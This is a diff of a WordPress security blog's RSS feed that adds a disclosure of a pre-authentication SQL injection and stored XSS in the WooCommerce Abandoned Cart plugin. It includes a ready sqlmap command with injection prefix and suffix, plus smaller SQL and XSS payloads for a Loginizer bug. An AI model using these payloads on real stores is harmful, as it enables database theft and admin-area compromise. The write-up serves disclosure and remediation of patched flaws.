@@ -12,14 +12,120 @@
 	<atom:link href="https://wpdeeply.com/tag/fixed/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description>// Silence is golden.  Not for you!</description>
-	<lastBuildDate>Wed, 21 Oct 2020 11:21:23 +0000</lastBuildDate>
+	<lastBuildDate>Thu, 05 Nov 2020 12:18:56 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=5.5.1</generator>
+	<generator>https://wordpress.org/?v=5.5.3</generator>
 	<item>
+		<title>WooCommerce abandoned cart before 5.8.2 SQL injection</title>
+		<link>https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Thu, 05 Nov 2020 12:18:51 +0000</pubDate>
+				<category><![CDATA[plugins]]></category>
+		<category><![CDATA[fixed]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=82</guid>
+
+					<description><![CDATA[Abandoned Cart Plugin stands for recovering abandoned shopping carts for WooCommerce. Plugin source code is in quite bad shape from the good WP plugin development practices, but it got quite good coverage from some Woo &#8220;authorities&#8221; in the past and it is installed on 30k+ active stores. Here we talk about preauth SQL injection that &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/"> <span class="screen-reader-text">WooCommerce abandoned cart before 5.8.2 SQL injection</span> Read More &#187;</a></p>]]></description>
+										<content:encoded><![CDATA[
+<p>Abandoned Cart Plugin stands for recovering abandoned shopping carts for WooCommerce. Plugin source code is in quite bad shape from the good WP plugin development practices, but it got quite good coverage from some Woo &#8220;authorities&#8221; in the <a rel="noreferrer noopener" href="https://www.google.com/search?q=wordpress+woocommerce+abandoned+cart" target="_blank">past</a> and it is installed on 30k+ active <a rel="noreferrer noopener" href="https://wordpress.org/plugins/woocommerce-abandoned-cart/advanced/" target="_blank">stores</a>. Here we talk about preauth SQL injection that beside its consequences results in stored XSS directly in the WP admin area. Quite severe vulnerability when we speak about e-commerce.</p>
+
+
+
+<h2>Eli5 PoC</h2>
+
+
+
+<p>Vulnerability exists in <code>woocommerce_guest_ac</code> class, where on WP initialization and class constructor</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">add_action( 'init', 'load_ac_ajax' );
+</code></pre>
+
+
+
+<p>it is added not privileged ajax action</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function load_ac_ajax() {
+		if ( ! is_user_logged_in() ) {
+			add_action( 'wp_ajax_nopriv_save_data', 'save_data' );
+		}
+	}
+</code></pre>
+
+
+
+<p>in <code>save_data</code> we have the following &#8220;protections&#8221;</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">if ( isset( $_POST['billing_first_name'] ) &amp;&amp; '' !== $_POST['billing_first_name'] ) {
+				wcal_common::wcal_set_cart_session( 'billing_first_name', sanitize_text_field( wp_unslash( $_POST['billing_first_name'] ) ) );
+			}
+...
+// Insert record in guest table
+			$billing_first_name = wcal_common::wcal_get_cart_session( 'billing_first_name' );
+</code></pre>
+
+
+
+<p>and later this is the input towards not prepared DB query</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$insert_guest     = 'INSERT INTO `' . $wpdb->prefix . "ac_guest_abandoned_cart_history_lite`( billing_first_name, billing_last_name, email_id, billing_zipcode, shipping_zipcode, shipping_charges ) 
+                            VALUES ( '" . $billing_first_name . "', '" . $billing_last_name . "', '" . wcal_common::wcal_get_cart_session( 'billing_email' ) . "', '" . $billing_zipcode . "', '" . $shipping_zipcode . "', '" . $shipping_charges . "' )";
+			$wpdb->query( $insert_guest );
+</code></pre>
+
+
+
+<p>So achieving the preauth SQLi is quite trivial e.g. on checkout page when <code>save_data</code> ajax action is called. In order to verify this vulnerability on your local setup, you will need a WP/Woo cookies and plugin nonce <code>wcal_guest_capture_nonce</code>. So we have the following:</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">python3 sqlmap.py -u http://local.target/wp-admin/admin-ajax.php --cookie='[cookies content here]' --method='POST' --data='billing_first_name=wpdeeply&amp;billing_last_name=wpdeeply&amp;billing_company=wpdeeply&amp;billing_address_1=wpdeeply&amp;billing_address_2=wpdeeply&amp;billing_city=wpdeeply&amp;billing_state=wpdeeply&amp;billing_postcode=123234&amp;billing_country=GB&amp;billing_phone=12324&amp;billing_email=wpdeeply%40protonmail.com&amp;order_notes=&amp;wcal_guest_capture_nonce=[nonce-value]&amp;action=save_data' -p billing_first_name --prefix="', '', '','', '',( TRUE " --suffix=")) -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db --current-user
+</code></pre>
+
+
+
+<p>If you dive deeper into plugin code, you will notice that this content is displayed in admin area, so there is nice stored XSS too, almost the same technique like <a href="https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/" target="_blank" rel="noreferrer noopener">here</a>.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ab-cart.md#few-facts"></a></h2>
+
+
+
+<h2>Few facts</h2>
+
+
+
+<ul><li>As Woo owner you should trust no one regarding plugins / software on your e-commerce infrastructure.</li><li>Plugin developer was brave enough to ask for fix to be deployed in end of November while 100-200 new active installs per day happened and plugins team were &#8220;polite&#8221; enough to allow that</li><li>This bug seems like classical backdoor, but I&#8217;ll judge in a favor of not following best WP development practices</li><li>Woo vulnerabilities != WP vulnerabilities</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/ab-cart.md#remediation"></a></h2>
+
+
+
+<h2>Remediation</h2>
+
+
+
+<ul><li>Use best deployment practices for web / PHP applications</li><li>Test and regression verify code that lands on your e-commerce</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>Loginizer before 1.6.4 SQLi injection</title>
 		<link>https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/</link>
 		
@@ -111,6 +217,25 @@ $insert = $wpdb->query("INSERT INTO `".$wpdb->prefix."loginizer_logs` SET `usern
 
 
 <pre class="wp-block-code"><code lang="php" class="language-php">// Get the logs
+	$result = lz_selectquery("SELECT * FROM `".$wpdb->prefix."loginizer_logs` 
+							ORDER BY `time` DESC 
+							LIMIT ".$lz_env['cur_page'].", ".$lz_env['res_len']."", 1);
+...
+foreach($result as $ik => $iv){
+					$status_button = (!empty($iv['status']) ? 'disable' : 'enable');
+					echo '
+					&lt;tr>
+						&lt;td>
+							&lt;input type="checkbox" value="'.$iv['ip'].'" name="lz_reset_ips[]" />
+						&lt;/td>
+						&lt;td>
+							'.$iv['ip'].'
+						&lt;/td>
+						&lt;td>
+							'.$iv['username'].'
+						&lt;/td>
+
+
 </code></pre>
 
 
@@ -119,7 +244,7 @@ $insert = $wpdb->query("INSERT INTO `".$wpdb->prefix."loginizer_logs` SET `usern
 
 
 
-<pre class="wp-block-code"><code class="">test',ip=concat(char(60),'b',char(62),'wpdeeply',char(60),char(47),'b',char(62),'-',LEFT(UUID(),8)) -- wpdeeply
+<pre class="wp-block-code"><code lang="sql" class="language-sql">test',ip=concat(char(60),'b',char(62),'wpdeeply',char(60),char(47),'b',char(62),'-',LEFT(UUID(),8)) -- wpdeeply
 </code></pre>
 
 
@@ -162,7 +287,7 @@ $insert = $wpdb->query("INSERT INTO `".$wpdb->prefix."loginizer_logs` SET `usern
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">//second
+<pre class="wp-block-code"><code lang="php" class="language-php">if ( ip2long("127.0.0.1\x00'&lt;script>") ) echo 'Valid IPv4';
 </code></pre>
 
 
